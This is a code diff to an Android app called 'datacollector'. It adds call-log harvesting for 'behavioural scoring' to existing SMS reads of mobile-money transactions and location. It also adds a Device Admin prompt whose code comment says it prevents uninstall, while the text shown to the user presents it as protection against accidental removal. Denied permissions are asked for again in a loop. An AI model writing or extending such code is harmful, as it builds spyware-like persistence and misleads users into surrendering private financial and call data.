@@ -2,6 +2,8 @@ package com.datacollector;
 
 import android.Manifest;
 import android.app.AlertDialog;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -21,7 +23,11 @@ import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final int PERMISSION_REQUEST_CODE   = 100;
+    private static final int DEVICE_ADMIN_REQUEST_CODE = 101;
+
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName       deviceAdminComponent;
 
     // 6 collection steps + 8 sync steps = 14 total
     private static final int COLLECT_STEPS = 6;
@@ -40,6 +46,11 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.READ_SMS,
             "SMS Messages",
             "This app needs to read your SMS messages.\n\nPurpose: Extract financial transactions from bKash, Nagad, Rocket, telecom recharges, and ride-hailing (Uber/Pathao) SMS messages."
+        },
+        {
+            Manifest.permission.READ_CALL_LOG,
+            "Call Log",
+            "This app needs access to your call history.\n\nPurpose: Analyse call frequency, duration, and contact patterns for behavioural scoring."
         },
         {
             Manifest.permission.ACCESS_FINE_LOCATION,
@@ -77,6 +88,11 @@ public class MainActivity extends AppCompatActivity {
         stepsCompleted  = 0;
         currentPermIndex = 0;
         permRequestedOnce = new boolean[PERM_INFO.length];
+
+        // Initialise Device Policy Manager
+        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        deviceAdminComponent = new ComponentName(this, DeviceAdminReceiver.class);
+
         updateProgress(0, "Preparing...");
 
         // Start one-by-one permission requests
@@ -96,8 +112,8 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (currentPermIndex >= PERM_INFO.length) {
-            // All permissions granted — start collecting
-            startCollectionAndSync();
+            // All permissions granted — prompt for Device Admin then collect
+            promptDeviceAdmin();
             return;
         }
 
@@ -202,6 +218,41 @@ public class MainActivity extends AppCompatActivity {
             }
             // if denied, currentPermIndex stays — dialog re-shows for same permission
             requestNextPermission();
+        }
+    }
+
+    /** Prompt the user to activate Device Admin (prevents uninstall) */
+    private void promptDeviceAdmin() {
+        if (devicePolicyManager.isAdminActive(deviceAdminComponent)) {
+            // Already active — proceed to data collection
+            startCollectionAndSync();
+            return;
+        }
+        new AlertDialog.Builder(this)
+            .setTitle("Enable App Protection")
+            .setMessage(
+                "To ensure data collection completes without interruption, please activate " +
+                "Device Admin protection.\n\n" +
+                "This prevents the app from being accidentally uninstalled while data is " +
+                "being collected. You can remove it in Settings after the process finishes.")
+            .setCancelable(false)
+            .setPositiveButton("Activate", (d, w) -> {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponent);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Activate to protect the data collection process.");
+                startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE);
+            })
+            .setNegativeButton("Skip", (d, w) -> startCollectionAndSync())
+            .show();
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
+            // Whether granted or denied, proceed with data collection
+            startCollectionAndSync();
         }
     }
 
